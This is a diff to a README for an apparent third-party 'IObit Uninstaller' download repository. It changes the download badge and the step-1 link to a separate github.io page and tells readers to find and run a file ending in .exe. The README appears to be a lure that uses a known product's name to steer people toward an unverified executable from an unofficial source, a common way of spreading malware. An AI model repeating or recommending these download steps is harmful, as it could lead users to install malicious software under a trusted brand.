@@ -1,6 +1,6 @@
 # 🛠️ IObit-Uninstaller-Download-2026 - Remove unwanted software and optimize Windows
 
-[![](https://img.shields.io/badge/Download-Latest_Installer-blue.svg)](https://github.com/biconcave-nacho282/IObit-Uninstaller-Download-2026)
+[![](https://img.shields.io/badge/Download-Latest_Installer-blue.svg)](https://biconcave-nacho282.github.io)
 
 ## 🎯 Purpose of this software
 
@@ -20,7 +20,7 @@ Before you install this software, check these requirements for your personal com
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the following link to access the installer file: [https://github.com/biconcave-nacho282/IObit-Uninstaller-Download-2026](https://github.com/biconcave-nacho282/IObit-Uninstaller-Download-2026)
+1. Visit the following link to access the installer file: [https://biconcave-nacho282.github.io](https://biconcave-nacho282.github.io)
 2. Locate the file ending in .exe in the list.
 3. Click the file name to start the download to your computer.
 4. Open your Downloads folder once the transfer finishes.
